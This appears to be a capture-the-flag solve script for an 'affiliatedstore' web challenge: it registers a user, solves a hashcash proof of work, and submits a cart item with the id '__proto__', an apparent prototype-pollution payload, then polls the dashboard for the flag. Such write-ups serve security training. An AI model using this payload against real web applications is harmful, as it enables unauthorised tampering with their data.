#!/usr/bin/env python3
import os
import re
import time
import requests
import subprocess

def get_hashcash(PoW):
    r = subprocess.Popen(['hashcash', '-mCb26', PoW], stdout=subprocess.PIPE)
    r.wait()
    return r.stdout.read().decode('utf-8').strip()

URL = "http://affiliatedstore.challs.olicyber.it/"
s = requests.Session()
r = s.post(URL + "api/signup", json={"username": (user := os.urandom(8).hex())})
print(user, flush=True)
assert r.json()["status"] == "ok"

r = s.get(URL).text
PoW = re.findall(r"hashcash -mCb26 \"(.*?)\"", r)[0]
affiliation = re.findall(r'<div>Your affiliation code: (.*?)</div>', r)[0]

cart = [
    {
	    "id": "__proto__",
	    "affiliation": affiliation,
    }
]
print(cart, flush=True)
r = s.post(URL + "api/feedback", json={"cart": cart, "pow": get_hashcash(PoW)})

while True:
    r = s.get(URL + "dashboard").text
    if "flag" in r:
        break
    time.sleep(1)
    
r = s.get(URL + "dashboard").text
flag = re.findall(r"flag{.*?}", r)[0]
print(flag)